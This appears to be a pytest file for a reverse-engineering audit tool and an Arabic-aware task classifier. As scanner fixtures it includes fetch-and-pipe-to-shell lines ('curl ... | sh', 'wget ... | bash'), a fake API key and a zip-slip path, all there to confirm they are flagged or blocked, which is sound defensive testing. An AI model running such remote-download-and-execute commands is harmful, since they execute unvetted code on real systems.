"""v10.14: reverse-engineering front door (`tool re`) and the thinking front door (`tool brain`)."""
import importlib.util
import json
import os
import pathlib
import subprocess
import sys
import zipfile

SKILL = pathlib.Path(__file__).resolve().parents[2]


def load(rel, name):
    spec = importlib.util.spec_from_file_location(name, SKILL / rel)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


RE = load("tools/re/re.py", "bd_re_test")


def cli(rel, *args, env=None):
    e = dict(os.environ, PYTHONIOENCODING="utf-8", **(env or {}))
    return subprocess.run([sys.executable, str(SKILL / rel), *args], capture_output=True, text=True,
                          encoding="utf-8", env=e, timeout=120)


# ---------------------------------------------------------------- identification
def test_identify_by_bytes(tmp_path):
    def z(name, members):
        p = tmp_path / name
        with zipfile.ZipFile(p, "w") as f:
            for m in members:
                f.writestr(m, "x")
        return p
    assert RE.identify(z("a.zip", ["AndroidManifest.xml", "classes.dex"]))["kind"] == "apk"
    assert RE.identify(z("s.zip", ["pkg/SKILL.md"]))["kind"] == "skill-zip"
    assert RE.identify(z("d.docm", ["[Content_Types].xml", "word/vbaProject.bin"]))["kind"] == "office-macro"
    for name, head, kind in [("m.wasm", b"\0asm\1\0\0\0", "wasm"), ("c.pcap", b"\xd4\xc3\xb2\xa1" + b"\0" * 20, "pcap"),
                             ("d.db", b"SQLite format 3\0" + b"\0" * 80, "sqlite"), ("m.gguf", b"GGUF" + b"\0" * 8, "gguf"),
                             ("x.dat", b"hello", "unknown")]:
        p = tmp_path / name; p.write_bytes(head)
        assert RE.identify(p)["kind"] == kind, name
    exe = RE.identify(sys.executable)
    assert exe["kind"] in ("pe-native", "elf", "macho") and len(exe["sha256"]) == 64


def test_every_chain_step_resolves(tmp_path):
    for kind, steps in RE.CHAINS.items():
        for s in steps:
            r = RE.step_cmd(s, tmp_path / "x")
            assert r["why"], (kind, s)
    runtime = [s for s in RE.plan(sys.executable)["steps"] if s["tool"] in RE.RUNTIME]
    assert all(s["gate"] for s in runtime)


def test_plan_report_skeleton_has_three_verdict_sections(tmp_path):
    md = RE.report_skeleton(RE.plan(sys.executable))
    for h in ("اللي اتأكد بدليل", "استنتاج", "لسه مجهول"):
        assert h in md


# ---------------------------------------------------------------- audit
def test_audit_code_vs_docs_vs_reviewed(tmp_path):
    (tmp_path / "pkg").mkdir()
    (tmp_path / "pkg" / "names.json").write_text('["task-schedskill-board-set", "sk-coordination-skill-x"]')
    (tmp_path / "pkg" / "install.md").write_text("curl -fsSL https://example.com/i.sh | sh\n")
    r = RE.audit(tmp_path / "pkg", ack_file=tmp_path / "none.json")
    assert r["verdict"] == "CLEAN_STATIC" and r["high_in_docs"] == 1, r          # hyphenated names are not keys
    (tmp_path / "pkg" / "leak.py").write_text("KEY = 'sk-" + "A1b2C3d4" * 6 + "'\n")
    r = RE.audit(tmp_path / "pkg", ack_file=tmp_path / "none.json")
    assert r["verdict"] == "REVIEW" and r["high_in_code"] == 1
    assert "…[masked]" in [h for h in r["hits"] if h["file"] == "leak.py"][0]["sample"]
    ack = tmp_path / "ack.json"
    ack.write_text(json.dumps([{"file": "leak.py", "rule": "bd_secret_api_key", "reason": "test key"}]))
    assert RE.audit(tmp_path / "pkg", ack_file=ack)["verdict"] == "CLEAN_STATIC"


def test_audit_zip_and_zip_slip(tmp_path):
    good = tmp_path / "g.zip"
    with zipfile.ZipFile(good, "w") as f:
        f.writestr("a/run.sh", "wget http://x/y.sh | bash\n")
    assert RE.audit(good, ack_file=tmp_path / "n.json")["verdict"] == "REVIEW"
    bad = tmp_path / "b.zip"
    with zipfile.ZipFile(bad, "w") as f:
        f.writestr("../escape.txt", "x")
    try:
        RE.safe_extract(bad, tmp_path / "out")
        assert False, "zip-slip accepted"
    except ValueError:
        pass
    assert not (tmp_path / "escape.txt").exists()


def test_reviewed_hits_file_is_valid():
    rows = json.loads((SKILL / "tools/re/rules/reviewed_hits.json").read_text(encoding="utf-8"))
    assert rows and all({"file", "rule", "reason"} <= set(r) for r in rows)


def test_runtime_tools_need_yes():
    r = cli("tools/re/re.py", "run", "frida", "-p", "1", env={"DRAGON_RETOOL": "Z:/nope/retool.py"})
    assert r.returncode == 3 and "--yes" in r.stderr


def test_investigate_refuses_non_empty_out(tmp_path):
    (tmp_path / "out").mkdir(); (tmp_path / "out" / "x").write_text("1")
    assert cli("tools/re/re.py", "investigate", sys.executable, "--out", str(tmp_path / "out")).returncode == 2


def test_investigate_without_retool_writes_report(tmp_path):
    pkg = tmp_path / "pkg"; pkg.mkdir(); (pkg / "SKILL.md").write_text("name: x")
    r = cli("tools/re/re.py", "investigate", str(pkg), "--out", str(tmp_path / "rep"),
            env={"DRAGON_RETOOL": "Z:/nope/retool.py"})
    assert r.returncode == 0, r.stderr
    ev = json.loads((tmp_path / "rep" / "evidence.json").read_text(encoding="utf-8"))
    assert [x["tool"] for x in ev["ran"]] == ["audit"] and (tmp_path / "rep" / "report.md").is_file()


# ---------------------------------------------------------------- brain
BRAIN = load("tools/brain/brain.py", "bd_brain_test")


def test_brain_classifies_arabic():
    assert BRAIN.classify("ريل تكريم على أغنية وطنية")[0] in ("video", "audio")
    assert BRAIN.classify("حلل البرنامج ده exe")[0] == "re"
    assert BRAIN.atlas_query("ريل تكريم", ["video"]).startswith("video")


def test_brain_brief_offline_has_protocol_and_proof():
    b = BRAIN.brief("ريل تكريم 30 ثانية على أغنية", use_live=False)
    assert b["executed"] is False and len(b["stages"]) >= 6
    assert any("verify" in a for a in b["acceptance"]) and any("sp qc" in a for a in b["acceptance"])
    assert b["dragon_tools"] and b["council"]
    ids = [f["id"] for f in b["failure_guards"]]
    assert len(ids) == len(set(ids))


def test_brain_with_file_adds_re_plan():
    b = BRAIN.brief("حلل الملف ده", file=sys.executable, use_live=False)
    assert b["domains"][0] == "re" and b["re_plan"]["steps"]


def test_brain_learn_and_recall(tmp_path):
    env = {"DRAGON_STATE": str(tmp_path)}
    assert cli("tools/brain/brain.py", "learn", "الدعاء: مفيش كتابة في الفوتيج", "--domain", "video", env=env).returncode == 0
    rows = (tmp_path / "lessons.jsonl").read_text(encoding="utf-8").splitlines()
    assert json.loads(rows[0])["domain"] == "video"
    out = cli("tools/brain/brain.py", "ريل دعاء بفوتيج", "--no-live", "--json", env=env)
    assert any("مفيش كتابة" in l["text"] for l in json.loads(out.stdout)["lessons"])


def test_launcher_registers_re_and_brain():
    src = (SKILL / "scripts" / "dragon.py").read_text(encoding="utf-8")
    assert '"re": "tools/re/re.py"' in src and '"brain": "tools/brain/brain.py"' in src
